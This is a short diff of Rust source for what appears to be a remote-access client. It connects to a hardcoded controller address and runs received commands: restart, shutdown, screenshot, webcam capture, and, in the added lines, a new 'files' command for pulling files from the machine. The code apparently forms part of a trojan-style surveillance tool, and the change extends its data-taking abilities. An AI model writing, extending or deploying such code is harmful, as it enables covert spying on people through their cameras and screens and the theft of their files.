@@ -9,6 +9,7 @@ use components::restart;
 use components::shutdown;
 use components::screenshot;
 use components::webcam;
+use components::files;
 
 pub mod utilities;
 mod components {
@@ -18,6 +19,7 @@ mod components {
     pub mod shutdown;
     pub mod screenshot;
     pub mod webcam;
+    pub mod files;
 }
 
 const SERVER : &str = "192.168.2.220";
@@ -56,6 +58,7 @@ fn main() {
                             "shutdown" => shutdown::shutdown_computer(&stream),
                             "screenshot" => screenshot::capture(&stream),
                             "webcam" => webcam::capture(&stream),
+                            "files" => files::get_files(&stream),
                             
                             _ => {
                                 println!("Unknown command: {}", command);
